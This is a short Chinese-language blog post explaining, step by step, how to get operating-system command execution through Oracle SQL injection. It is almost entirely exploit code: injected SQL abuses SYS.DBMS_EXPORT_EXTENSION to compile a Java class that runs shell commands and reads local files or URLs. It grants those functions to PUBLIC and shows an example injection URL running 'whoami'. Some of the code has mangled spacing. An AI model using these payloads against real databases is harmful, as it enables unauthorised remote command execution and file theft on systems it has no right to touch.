---
title: 通过Oracle注入执行系统命令 
tags:
- sql注入
- Oracle
- 命令执行
toc: flase
date: 2016-07-012 18:08:37
description:
categories: Web安全
---
5个步骤：

1. 创建Java类
2. 给Java赋予执行权限
3. 创建函数来执行CMD
4. 授予public对扩展存储过程的 EXECUTE 权限
5. 运行命令

例如命令执行为:

···
http://3389.in/ora2.php?name=1%20and%201=(select%20sys.LinxRunCMD(%27cmd.exe%20/c%20whoami%27)%20from%20dual)
···

执行命令
```sql
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named"LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args){try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream()) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str %2b=stemp%2b"\n";myReader.close();returnstr;} catch (Exception e){return e.toString();}}public static String readFile(String filename){try{BufferedReadermyReader= new BufferedReader(new FileReader(filename)); String stemp,str="";while ((stemp = myReader.readLine()) !=null) str %2b=stemp%2b"\n";myReader.close();return str;} catch (Exception e){returne.toString();}}}'''';END;'';END;--','SYS',0,'1',0) from dual
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''<>'''''''', ''''''''execute'''''''');end;'''';END;'';END;--','SYS',0,'1',0) from dual
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function LinxRunCMD(p_cmd invarchar2) return varchar2 as language java name ''''''''LinxUtil.runCMD(java.lang.String) return String'''''''';'''';END;'';END;--','SYS',0,'1',0) from dual
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxRunCMD topublic'''';END;'';END;--','SYS',0,'1',0) from dual
select sys.LinxRunCMD('cmd.exe /c whoami') from dual
```
<!-- more -->

读取文件
```sql
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE''DECLAREPRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "LinxUtil" asimport java.io.*;import java.net.URL; public class LinxUtil extends Object {public static String runCMD(String args){try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream()) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str %2b=stemp%2b"\n";myReader.close();returnstr;} catch (Exception e){return e.toString();}}public static String readFile(String filename){try{BufferedReadermyReader= new BufferedReader(filename.startsWith("http")?new InputStreamReader(new URL(filename).openStream()):newFileReader(filename));String stemp,str="";while ((stemp = myReader.readLine()) != null) str%2b=stemp%2b"\n";myReader.close();return str;} catch (Exception e){returne.toString();}}}'''';END;'';END;--','SYS',0,'1',0) from dual
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE''DECLAREPRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxReadFile topublic'''';END;'';END;--','SYS',0,'1',0) from dual
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE''DECLAREPRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function LinxReadFile(filename in varchar2)return varchar2 as language java name ''''''''LinxUtil.readFile(java.lang.String) return String'''''''';'''';END;'';END;--','SYS',0,'1',0) from dual
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE''DECLAREPRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxReadFile topublic'''';END;'';END;--','SYS',0,'1',0) from dual
select sys.LinxReadFile('C:\boot.ini') from dual;
```

ps:权限为DBA,一个步骤为一行命令,请注意格式


